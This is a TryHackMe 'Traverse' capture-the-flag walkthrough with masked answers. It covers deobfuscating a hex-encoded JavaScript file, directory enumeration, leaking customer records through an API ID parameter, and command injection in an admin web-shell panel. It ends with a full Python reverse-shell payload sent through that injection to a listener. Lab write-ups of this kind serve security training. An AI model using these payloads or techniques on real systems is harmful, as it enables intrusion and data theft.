@@ -1,0 +1,84 @@
+#######################################
+##https://tryhackme.com/room/traverse##
+#######################################
+Tryhackme CTF-Solution
+
+What type of encoding is used by the hackers to obfuscate the JavaScript file?
+step 1: view-source:http://MACHINE IP/
+step 2: check view-source:http://MACHINE IP/custom.min.js
+step 3: When i check the custom.min.js file there was a hex values inside the file.
+hex value : "28 66 75 6E 63 74 69 6F 6E 28 29 7B 66 75 6E 63 74 69 6F 6E 20 64 6F 4E 6F 74 68 69 6E 67 28 29 7B 7D 76 61 72 20 6E 3D 22 44 49 52 45 43 54 4F 52 59 22 3B 76 61 72 20 65 3D 22 4C 49 53 54 49 4E 47 22 3B 76 61 72 20 6F 3D 22 49 53 20 54 48 45 22 3B 76 61 72 20 69 3D 22 4F 4E 4C 59 20 57 41 59 22 3B 76 61 72 20 66 3D 6E 75 6C 6C 3B 76 61 72 20 6C 3D 66 61 6C 73 65 3B 76 61 72 20 64 3B 69 66 28 66 3D 3D 3D 6E 75 6C 6C 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 46 6C 61 67 3A 22 2B 6E 2B 22 20 22 2B 65 2B 22 20 22 2B 6F 2B 22 20 22 2B 69 29 3B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 20 69 66 28 74 79 70 65 6F 66 20 66 3D 3D 3D 22 75 6E 64 65 66 69 6E 65 64 22 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 69 66 28 6C 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 28 66 75 6E 63 74 69 6F 6E 28 29 7B 69 66 28 64 29 7B 66 6F 72 28 76 61 72 20 6E 3D 30 3B 6E 3C 31 30 3B 6E 2B 2B 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 54 68 69 73 20 63 6F 64 65 20 64 6F 65 73 20 6E 6F 74 68 69 6E 67 2E 22 29 7D 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 65 6C 73 65 7B 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 7D 29 28 29 7D 7D 7D 29 28 29 3B"
+
+Answer:***
+What is the flag value after deobfuscating the file?
+step 1: Converting hex to text > https://www.rapidtables.com/convert/number/hex-to-ascii.html
+result: "(function(){function doNothing(){}var n="DIRECTORY";var e="LISTING";var o="IS THE";var i="ONLY WAY";var f=null;var l=false;var d;if(f===null){console.log("Flag:"+n+" "+e+" "+o+" "+i);d=undefined}else if(typeof f==="undefined"){d=undefined}else{if(l){d=undefined}else{(function(){if(d){for(var n=0;n<10;n++){console.log("This code does nothing.")}doNothing()}else{doNothing()}})()}}})();"
+Answer: ******* ****** ****** ***** ***** ***
+
+Logging is an important aspect. What is the name of the file containing email dumps?
+step 1: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://MACHINE IP/
+results of the gobuster:
+#
+/client               (Status: 301) [Size: 313] [--> http://MACHINE IP/client/]
+/api                  (Status: 301) [Size: 310] [--> http://MACHINE IP/api/]
+/javascript           (Status: 301) [Size: 317] [--> http://MACHINE IP/javascript/]                                                                                 
+/img                  (Status: 301) [Size: 310] [--> http://MACHINE IP/img/]
+/logs                 (Status: 301) [Size: 311] [--> http://MACHINE IP/logs/]	      #This is the directory we are looking for.													
+/planning             (Status: 301) [Size: 315] [--> http://MACHINE IP/planning/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://MACHINE IP/phpmyadmin/]
+#
+step 2: checking /logs directory > http://MACHINE IP/logs/ >
+inside the /logs directory there is a file named >  **********.*** > http://MACHINE IP/logs/email_dump.txt
+Answer: **********.***
+
+The logs folder contains email logs and has a message for the software team lead. What is the name of the directory that Bob has created?
+step 1: checking  **********.*** in the file there is text >
+"
+From: Bob <bob@tourism.mht>
+To: Mark <mark@tourism.mht>
+Subject: API Credentials
+
+Hey Mark,
+
+Sorry I had to rush earlier for the holidays, but I have created the directory for you with all the required information for the API.
+You loved SSDLC so much, I named the API folder under the name of the first phase of SSDLC.
+This page is password protected and can only be opened through the key. ****************
+
+See ya after the holidays
+
+Bob.
+" > the importing information here to us " I named the API folder under the name of the first phase of SSDLC. " and then i search the "sdlc phases" on google so i learned the first phase was "***** Stage" > http://MACHINE IP/********/ 
+Answer:********
+
+What is the key file for opening the directory that Bob has created for Mark?
+step 1: Inside the email_dump.txt there was a information about that > "This page is password protected and can only be opened through the key. **********"
+Answer: ***********
+
+What is the email address for ID 5 using the leaked API endpoint?
+step 1: http://MACHINE IP/planning/ >  INFO : API Request : GET http://MACHINE IP/api/?customer_id=1 >
+step 2: http://MACHINE IP/api/?customer_id=5
+Answer: ***********.***
+
+What is the ID for the user with admin privileges?
+step 1: I check the IDs one by one and then found that value "isadmin":"1" ( try from 1 to 7 for x value here ) > customer_id=x inside the customer_id=* > http://MACHINE IP/api/?customer_id=x 
+Answer: *
+
+What is the endpoint for logging in as the admin? Mention the last endpoint instead of the URL. For example, if the answer is URL is tryhackme.com/admin - Just write /admin.
+step 1: http://MACHINE IP/api/?customer_id=3 > check the value of ["loginURL"]:"/*******"
+Answer:********
+
+The attacker uploaded a web shell and renamed a file used for managing the server. Can you find the name of the web shell that the attacker has uploaded?
+step 1: login to http://MACHINE IP/realadmin/main.php > check the http://MACHINE IP/api/?customer_id=3 for the credentials.
+step 2: Open the brute suite and intercept > "System Owner" click Execute button;
+step 3: Then change the value of "commands=whoami" to "commands=ls -la"
+Answer: ***********.***
+
+What is the name of the file renamed by the attacker for managing the web server?
+Answer: ***************.***
+
+Can you use the file manager to restore the original website by removing the "FINALLY HACKED" message? What is the flag value after restoring the main website?
+step 1: generate shell > https://www.revshells.com/ > just input your IP and set your port >
+step 2: type to terminal : nc -lnvp 4444
+step 3: http://MACHINE IP/realadmin/main.php > click execute > intercept with burp suite then change the value of commands to commands=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;+pty.spawn("sh")'
+step 4: cat /var/www/html/index.php
+Answer: ****************
